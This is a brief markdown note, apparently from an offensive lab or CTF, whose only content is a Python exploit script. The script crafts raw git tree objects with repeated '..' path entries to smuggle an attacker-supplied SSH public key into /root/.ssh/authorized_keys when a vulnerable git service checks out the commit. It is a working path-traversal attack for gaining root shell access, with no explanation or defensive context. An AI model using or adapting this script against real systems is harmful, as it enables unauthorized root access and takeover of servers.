---
date: 2026-06-26 02:02
tags:
  - python
---

# Introduction


# Script 

```py
#!/usr/bin/env python3
import hashlib
import zlib
import os
import subprocess
import sys
import time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
if r.returncode != 0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
    sys.exit(1)

key = r.stdout.strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

